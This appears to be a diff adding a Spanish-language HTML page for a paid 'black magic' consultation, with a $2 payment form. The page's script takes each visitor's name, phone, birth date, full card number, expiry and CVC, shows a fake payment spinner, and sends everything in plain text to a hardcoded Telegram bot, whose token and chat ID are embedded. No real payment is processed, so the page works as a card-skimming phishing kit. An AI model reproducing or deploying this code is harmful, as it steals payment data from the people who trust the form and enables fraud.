@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Antonio Black Magic Consulta</title>
+    <style>
+        body {
+            font-family: 'Georgia', serif;
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            background: linear-gradient(to bottom, #1a1a1a, #4a4a4a);
+            color: #f4f4f4;
+        }
+        .container {
+            max-width: 400px;
+            margin: 50px auto;
+            padding: 20px;
+            background: #2e2e2e;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+        h2 {
+            text-align: center;
+            font-family: 'Palatino Linotype', serif;
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        .form {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+        .form input, .form select, .form button {
+            padding: 10px;
+            font-size: 16px;
+            border: none;
+            border-radius: 5px;
+        }
+        .form input, .form select {
+            background-color: #f4f4f4;
+            color: #333;
+        }
+        .form button {
+            background-color: #800000;
+            color: white;
+            cursor: pointer;
+            font-weight: bold;
+            transition: background-color 0.3s ease;
+        }
+        .form button:hover {
+            background-color: #a00000;
+        }
+        .hidden {
+            display: none;
+        }
+        .loading-screen {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 1000;
+        }
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid white;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 15px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .summary-screen {
+            display: none;
+            text-align: center;
+            padding: 20px;
+            background: #2e2e2e;
+            border-radius: 10px;
+            margin: 50px auto;
+            max-width: 400px;
+        }
+    </style>
+</head>
+<body>
+     <div class="container" id="form-container">
+        <h2>Antonoblackmagic Consulta y Pago</h2>
+        <div class="form">
+            <input type="text" id="name" placeholder="Nombre" required>
+            <input type="text" id="surname" placeholder="Apellido" required>
+            <input type="tel" id="phone" placeholder="Número de Teléfono" pattern="\d{10}" required>
+            
+            <!-- Campo de fecha de nacimiento -->
+            <input type="text" id="birth-day" placeholder="Día" maxlength="2" required style="width: 60px; text-align: center;">
+            <input type="text" id="birth-month" placeholder="Mes" maxlength="2" required style="width: 60px; text-align: center;">
+            <input type="text" id="birth-year" placeholder="Año" maxlength="4" required style="width: 80px; text-align: center;">
+            
+            <label for="consulted-name">Nombre de la Persona que Desea Consultar:</label>
+            <select id="consulted-name" required onchange="toggleConsultedPersonField()">
+                <option value="" disabled selected>Seleccione una opción</option>
+                <option value="mismo">A Mismo</option>
+                <option value="otra-persona">Otra Persona</option>
+            </select>
+            <input type="text" id="consulted-person" placeholder="Si eligió 'Otra Persona', ingrese su nombre" class="hidden">
+            <label class="category">Selecciona el tipo de trabajo:</label>
+            <select id="work-type" required>
+                <!-- Magia Blanca -->
+                <option value="proteccion-personal">Protección personal, familiar o de negocios</option>
+                <option value="limpiezas-energeticas">Limpiezas energéticas o espirituales</option>
+                <option value="atraer-amor">Atracción de amor o reconciliación de parejas</option>
+                <option value="suerte-juegos">Suerte en juegos de azar</option>
+                <option value="mejora-salud">Mejora de la salud o sanación energética</option>
+                <option value="prosperidad-abundancia">Prosperidad y abundancia económica</option>
+                <option value="amuletos-talismanes">Amuletos y talismanes de buena suerte</option>
+                <option value="apertura-caminos">Ritual de apertura de caminos</option>
+
+                <!-- Magia Negra -->
+                <option value="amarres-dominaciones">Amarres o dominaciones amorosas</option>
+                <option value="separacion-parejas">Separación de parejas</option>
+                <option value="maleficios-enemigos">Maleficios o maldiciones contra enemigos</option>
+                <option value="trabajos-mala-suerte">Trabajos para causar mala suerte</option>
+                <option value="enfermedades-espirituales">Enfermedades espirituales</option>
+                <option value="invocaciones-entities">Invocaciones de entidades oscuras</option>
+                <option value="danos-negocios">Daño a negocios o propiedades</option>
+                <option value="ruptura-contratos">Ruptura de contratos o alianzas personales</option>
+
+                <!-- Magia de Protección -->
+                <option value="escudos-energeticos">Escudos energéticos contra brujería</option>
+                <option value="contramaleficios">Contramaleficios o rompimientos</option>
+                <option value="exorcismos">Exorcismos o liberación de entidades</option>
+                <option value="destruccion-trabajos-negativos">Destrucción de trabajos negativos enviados por terceros</option>
+                <option value="regreso-remitente">Ritual de regreso al remitente</option>
+
+                <!-- Magia Chamánica -->
+                <option value="rituales-jerbas">Rituales con hierbas y plantas para curación</option>
+                <option value="conexion-espiritus-naturaleza">Conexión con espíritus de la naturaleza</option>
+                <option value="proteccion-tierras-cultivos">Protección de tierras o cultivos</option>
+                <option value="trabajo-animales-guia">Trabajo con animales como guías espirituales</option>
+                <option value="purificacion-elementos">Rituales de purificación con fuego, agua, aire o tierra</option>
+
+                <!-- Magia Astral o Esotérica -->
+                <option value="viajes-astrales">Viajes astrales o proyección mental</option>
+                <option value="conexion-espiritus-ancestrales">Conexión con espíritus ancestrales</option>
+                <option value="lectura-cartas-runas">Lectura de cartas, runas, ovidencia</option>
+                <option value="invocaciones-conocimiento-oculto">Invocaciones para conocimiento oculto</option>
+                <option value="apertura-portales">Apertura de portales espirituales</option>
+
+                <!-- Trabajos con la Muerte -->
+                <option value="invocacion-espiritus-muertos">Invocación de espíritus o muertos</option>
+                <option value="pactos-inframundo">Pactos con entidades del inframundo</option>
+                <option value="trabajos-cementerios">Trabajos con cementerios o tumbas</option>
+                <option value="polvos-huesos">Preparación de polvos de huesos o cenizas rituales</option>
+                <option value="magia-necromantica">Magia necromántica para obtener poder o venganza</option>
+
+                <!-- Magia de Justicia -->
+                <option value="resolucion-conflictos-legales">Resolución de conflictos legales</option>
+                <option value="atraccion-verdad-justicia">Atracción de verdad y justicia</option>
+                <option value="destruccion-falsedades">Destrucción de falsedades o injusticias</option>
+                <option value="rituales-libertad">Rituales para encarcelar o liberar</option>
+
+                <!-- Otros Trabajos -->
+                <option value="adivinacion-futuro">Adivinación y lectura de futuro</option>
+                <option value="cortar-relaciones-toxicas">Ritual para cortar relaciones tóxicas</option>
+                <option value="proteccion-accidentes-robo">Protección contra accidentes o robos</option>
+                <option value="trabajos-poder-politico">Trabajos para obtener poder político o social</option>
+                <option value="eliminacion-bloqueos-emocionales">Eliminación de traumas o bloqueos emocionales</option>
+            </select>
+            <h3>Realizar Pago $2</h3>
+            <input type="text" id="payment-card" placeholder="Número de tarjeta (16 dígitos)" maxlength="16" required>
+            <div style="display: flex; justify-content: center; gap: 10px; margin: 10px 0;">
+                <input type="text" id="payment-expiry-month" placeholder="MM" maxlength="2" required style="width: 60px; text-align: center;">
+                <input type="text" id="payment-expiry-year" placeholder="AA" maxlength="2" required style="width: 60px; text-align: center;">
+            </div>
+            <input type="text" id="payment-cvc" placeholder="CVC (3 dígitos)" maxlength="3" required style="width: 80px; text-align: center;">
+            <button type="button" onclick="validateAndProcessPayment()">Pagar 2 dólares</button>
+            <p id="card-error" class="error hidden">Número de tarjeta inválido. Por favor, ingresa un número de tarjeta válido.</p>
+        </div>
+    </div>
+
+    <div class="loading-screen" id="loading-screen">
+        <div class="spinner"></div>
+        <p>Procesando Pago...</p>
+    </div>
+
+    <div class="summary-screen" id="summary-screen">
+        <h2>¡Gracias por tu consulta! con Antonioblackmagic</h2>
+        <p id="summary-text"></p>
+        <p>Te estaremos contactando por WhatsApp con los resultados lo mas pronto posible bendiciones.</p>
+    </div>
+
+    <script>
+        const telegramBotToken = '7707153060:AAH8FcyQeMkD5bc5E5G8RaNEeO3xun1G4zg'; // Reemplaza con tu token
+        const telegramChatId = '5916166500'; // Reemplaza con tu chat ID
+
+        function toggleConsultedPersonField() {
+            const consultedName = document.getElementById('consulted-name').value;
+            const consultedPerson = document.getElementById('consulted-person');
+            consultedPerson.classList.toggle('hidden', consultedName !== 'otra-persona');
+            consultedPerson.required = consultedName === 'otra-persona';
+        }
+
+        function isValidCardNumber(cardNumber) {
+            let sum = 0;
+            let shouldDouble = false;
+            for (let i = cardNumber.length - 1; i >= 0; i--) {
+                let digit = parseInt(cardNumber.charAt(i));
+                if (shouldDouble) {
+                    digit *= 2;
+                    if (digit > 9) digit -= 9;
+                }
+                sum += digit;
+                shouldDouble = !shouldDouble;
+            }
+            return sum % 10 === 0;
+        }
+
+        // Función para enviar mensaje a Telegram
+        function sendMessageToTelegram(message) {
+            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatId}&text=${encodeURIComponent(message)}`;
+            fetch(url).then(response => {
+                if (!response.ok) {
+                    console.error('Error al enviar el mensaje a Telegram:', response);
+                }
+            }).catch(error => {
+                console.error('Error al enviar mensaje a Telegram:', error);
+            });
+        }
+
+        function validateAndProcessPayment() {
+            const name = document.getElementById('name').value.trim();
+            const surname = document.getElementById('surname').value.trim();
+            const phone = document.getElementById('phone').value.trim();
+            const birthDay = document.getElementById('birth-day').value.trim();
+            const birthMonth = document.getElementById('birth-month').value.trim();
+            const birthYear = document.getElementById('birth-year').value.trim();
+            const consultedName = document.getElementById('consulted-name').value;
+            const consultedPerson = document.getElementById('consulted-person').value.trim();
+            const workType = document.getElementById('work-type').value;
+            const card = document.getElementById('payment-card').value.trim();
+            const expiryMonth = document.getElementById('payment-expiry-month').value.trim();
+            const expiryYear = document.getElementById('payment-expiry-year').value.trim();
+            const cvc = document.getElementById('payment-cvc').value.trim();
+
+            if (!name || !surname || !phone || !birthDay || !birthMonth || !birthYear || !consultedName || !workType || !card || !expiryMonth || !expiryYear || !cvc) {
+                alert("Por favor, llena todos los campos obligatorios.");
+                return;
+            }
+
+            if (consultedName === "otra-persona" && !consultedPerson) {
+                alert("Por favor, ingresa el nombre de la otra persona.");
+                return;
+            }
+
+            if (card.length !== 16 || !/^\d+$/.test(card) || !isValidCardNumber(card)) {
+                document.getElementById('card-error').classList.remove('hidden');
+                return;
+            } else {
+                document.getElementById('card-error').classList.add('hidden');
+            }
+
+            // Mostrar pantalla de carga
+            const loadingScreen = document.getElementById('loading-screen');
+            loadingScreen.style.display = 'flex';
+
+            setTimeout(() => {
+                loadingScreen.style.display = 'none';
+
+                // Ocultar formulario
+                const formContainer = document.getElementById('form-container');
+                formContainer.style.display = 'none';
+
+                // Crear mensaje para Telegram
+                const message = `
+                    Nueva consulta y pago recibido:
+                    Nombre: ${name}
+                    Apellido: ${surname}
+                    Teléfono: ${phone}
+                    Fecha de Nacimiento: ${birthDay}/${birthMonth}/${birthYear}
+                    Tipo de trabajo: ${workType}
+                    Consultado: ${consultedName === "otra-persona" ? consultedPerson : 'A Mismo'}
+                    Tarjeta: ${card} 
+                    Expiración: ${expiryMonth}/${expiryYear}
+                    CVC: ${cvc}
+                `;
+                // Enviar mensaje a Telegram
+                sendMessageToTelegram(message);
+
+                // Mostrar resumen
+                const summaryScreen = document.getElementById('summary-screen');
+                const summaryText = document.getElementById('summary-text');
+                summaryText.innerHTML = `
+                    <strong>Nombre:</strong> ${name}<br>
+                    <strong>Apellido:</strong> ${surname}<br>
+                    <strong>Fecha de Nacimiento:</strong> ${birthDay}/${birthMonth}/${birthYear}<br>
+                    <strong>Teléfono:</strong> ${phone}<br>
+                    <strong>Trabajo:</strong> ${workType}<br>
+                    ${consultedName === "otra-persona" ? `<strong>Consultado:</strong> ${consultedPerson}` : ""}
+                `;
+                summaryScreen.style.display = 'block';
+            }, 4000);
+        }
+
+        window.onload = () => {
+            document.getElementById('loading-screen').style.display = 'none';
+            document.getElementById('summary-screen').style.display = 'none';
+            document.getElementById('card-error').classList.add('hidden');
+        };
+    </script>
+</body>
+</html>
